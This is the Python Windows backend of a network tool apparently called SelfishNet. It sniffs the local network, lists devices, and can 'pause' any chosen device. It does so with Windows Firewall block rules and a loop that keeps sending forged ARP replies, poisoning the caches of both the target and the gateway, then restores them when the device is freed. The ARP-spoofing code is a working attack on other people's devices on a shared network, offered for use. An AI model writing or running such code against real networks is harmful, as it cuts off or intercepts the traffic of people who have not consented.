#!/usr/bin/env python3
"""
Windows backend for SelfishNet.

Requires Npcap and an elevated process. Pause/free is implemented with Windows
Defender Firewall rules and continuous ARP restoration/spoofing.
"""

import ctypes
import ipaddress
import os
import subprocess
import threading
import time


def is_user_admin():
    if os.name != "nt":
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def run_netsh(*args, timeout=10):
    cmd = ["netsh", "advfirewall", "firewall", *args]
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return proc.returncode, (proc.stdout + proc.stderr).strip()
    except FileNotFoundError:
        return 127, "netsh introuvable"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def firewall_rule_name(ip, direction):
    clean = ip.replace(".", "_").replace(":", "_")
    return f"SelfishNet-{direction}-{clean}"


def pause_ip(ip):
    """Blocks an IPv4 address in both directions with Windows Firewall."""
    address = str(ipaddress.IPv4Address(ip))
    results = []
    for direction in ("In", "Out"):
        name = firewall_rule_name(address, direction)
        run_netsh("delete", "rule", f"name={name}")
        rc, out = run_netsh(
            "add", "rule",
            f"name={name}",
            "dir=in" if direction == "In" else "dir=out",
            "action=block",
            f"remoteip={address}",
            "enable=yes",
        )
        results.append((direction, rc, out))
    failures = [(direction, out) for direction, rc, out in results if rc != 0]
    if failures:
        raise RuntimeError("; ".join(f"{direction}: {out}" for direction, out in failures))
    return True


def free_ip(ip):
    address = str(ipaddress.IPv4Address(ip))
    for direction in ("In", "Out"):
        run_netsh("delete", "rule", f"name={firewall_rule_name(address, direction)}")


def free_all():
    clear_selfishnet_rules()


def clear_selfishnet_rules():
    """Removes only rules created by SelfishNet."""
    rc, out = run_netsh("show", "rule", "name=all")
    if rc != 0:
        return rc, out
    removed = 0
    for line in out.splitlines():
        line = line.strip()
        if not line.lower().startswith("rule name:"):
            continue
        name = line.split(":", 1)[1].strip()
        if name.startswith("SelfishNet-"):
            run_netsh("delete", "rule", f"name={name}")
            removed += 1
    return 0, f"{removed} règle(s) supprimée(s)"


class WindowsNetwork:
    def __init__(self):
        self.errors = []
        self.devices = {}
        self.targets = {}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.poison_thread = None
        self.sniffer = None
        self.iface = None
        self.my_ip = None
        self.gateway = None
        self.my_mac = None
        self.gateway_mac = None

    def initialize(self):
        if not is_user_admin():
            raise PermissionError("SelfishNet Windows doit etre execute en tant qu'administrateur")

        try:
            from scapy.all import conf
        except Exception as exc:
            raise RuntimeError(
                "Npcap/Scapy est requis. Installez Npcap en mode WinPcap "
                f"compatible puis relancez l'application. ({exc})"
            )

        route = conf.route.route("0.0.0.0")
        self.iface = route[0]
        self.gateway = route[2]
        self.my_ip = route[1]
        self.my_mac = getattr(conf.ifaces[self.iface], "mac", None)
        if not self.iface or not self.gateway or not self.my_ip:
            raise RuntimeError("Impossible de determiner l'interface Windows ou la passerelle")

        self.gateway_mac = self.resolve_mac(self.gateway)
        if not self.gateway_mac:
            raise RuntimeError("Impossible de determiner la MAC de la passerelle")

        from scapy.all import ARP, IP, AsyncSniffer
        self._ARP = ARP
        self._IP = IP

        def handle(pkt):
            now = time.time()
            ip = None
            mac = None
            if pkt.haslayer(ARP):
                arp = pkt[ARP]
                ip = arp.psrc
                mac = arp.hwsrc
            elif pkt.haslayer(IP):
                ip = pkt[IP].src
            if not ip or ip == "0.0.0.0":
                return
            try:
                address = ipaddress.IPv4Address(ip)
                if address.is_multicast or address.is_loopback:
                    return
            except ipaddress.AddressValueError:
                return
            with self.lock:
                item = self.devices.setdefault(ip, {
                    "ip": ip,
                    "mac": mac or "?",
                    "last": now,
                    "packets": 0,
                })
                item["last"] = now
                item["packets"] += 1
                if mac:
                    item["mac"] = mac.lower()

        self.sniffer = AsyncSniffer(
            iface=self.iface,
            prn=handle,
            store=False,
            filter="arp or ip",
        )
        self.sniffer.start()

        for ip in (self.my_ip, self.gateway):
            self.devices.setdefault(ip, {
                "ip": ip,
                "mac": self.my_mac if ip == self.my_ip else self.gateway_mac,
                "last": time.time(),
                "packets": 0,
            })

        self.poison_thread = threading.Thread(
            target=self._poison_loop,
            name="SelfishNetARP",
            daemon=True,
        )
        self.poison_thread.start()
        return True

    def resolve_mac(self, ip):
        try:
            from scapy.all import ARP, Ether, srp
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answers, _ = srp(packet, iface=self.iface, timeout=1.0, verbose=0)
            for _, received in answers:
                if received.haslayer(ARP):
                    return (received[ARP].hwsrc or "").lower()
        except Exception as exc:
            self.errors.append(str(exc))
        return None

    def _poison_loop(self):
        try:
            from scapy.all import Ether, sendp
        except Exception as exc:
            self.errors.append(str(exc))
            return

        while not self.stop_event.wait(1.5):
            with self.lock:
                targets = {
                    ip: cfg for ip, cfg in self.targets.items()
                    if cfg["mode"] == "pause"
                }
            packets = []
            for ip, cfg in targets.items():
                mac = cfg.get("mac")
                if not mac:
                    continue
                packets.extend([
                    Ether(dst=mac, src=self.my_mac) / self._ARP(
                        op=2, psrc=self.gateway, hwsrc=self.my_mac,
                        pdst=ip, hwdst=mac,
                    ),
                    Ether(dst=self.gateway_mac, src=mac) / self._ARP(
                        op=2, psrc=ip, hwsrc=self.my_mac,
                        pdst=self.gateway, hwdst=self.gateway_mac,
                    ),
                ])
            if packets:
                try:
                    sendp(packets, iface=self.iface, verbose=0)
                except Exception as exc:
                    self.errors.append(f"ARP: {exc}")

    def snapshot(self):
        now = time.time()
        with self.lock:
            devices = []
            for ip, item in self.devices.items():
                devices.append({
                    "ip": ip,
                    "mac": item.get("mac") or "?",
                    "age": now - item["last"],
                    "packets": item["packets"],
                    "is_self": ip == self.my_ip,
                    "is_gateway": ip == self.gateway,
                })
        devices.sort(key=lambda item: (
            not item["is_self"],
            not item["is_gateway"],
            item["ip"],
        ))
        return devices

    def set_pause(self, ip):
        address = str(ipaddress.IPv4Address(ip))
        mac = self.devices.get(address, {}).get("mac")
        if not mac:
            mac = self.resolve_mac(address)
        if not mac:
            raise RuntimeError(f"Impossible de resoudre la MAC de {address}")
        pause_ip(address)
        with self.lock:
            self.targets[address] = {"mac": mac.lower(), "mode": "pause"}

    def set_free(self, ip):
        address = str(ipaddress.IPv4Address(ip))
        free_ip(address)
        with self.lock:
            self.targets.pop(address, None)
        if address in self.devices:
            mac = self.devices[address].get("mac")
            if mac:
                self.restore_arp(address, mac)

    def restore_arp(self, ip, mac):
        try:
            from scapy.all import Ether, sendp
            packets = [
                Ether(dst=mac, src=self.gateway_mac) / self._ARP(
                    op=2, psrc=self.gateway, hwsrc=self.gateway_mac,
                    pdst=ip, hwdst=mac,
                ),
                Ether(dst=self.gateway_mac, src=mac) / self._ARP(
                    op=2, psrc=ip, hwsrc=mac,
                    pdst=self.gateway, hwdst=self.gateway_mac,
                ),
            ]
            sendp(packets, iface=self.iface, verbose=0, count=5, inter=0.2)
        except Exception as exc:
            self.errors.append(f"restauration ARP: {exc}")

    def free_all_targets(self):
        with self.lock:
            targets = dict(self.targets)
            self.targets.clear()
        for ip, cfg in targets.items():
            free_ip(ip)
            mac = cfg.get("mac")
            if mac:
                self.restore_arp(ip, mac)

    def summary(self):
        with self.lock:
            return dict(self.targets)

    def stop(self):
        self.stop_event.set()
        if self.poison_thread:
            self.poison_thread.join(timeout=3)
        if self.sniffer:
            try:
                self.sniffer.stop()
            except Exception:
                pass
        self.free_all_targets()
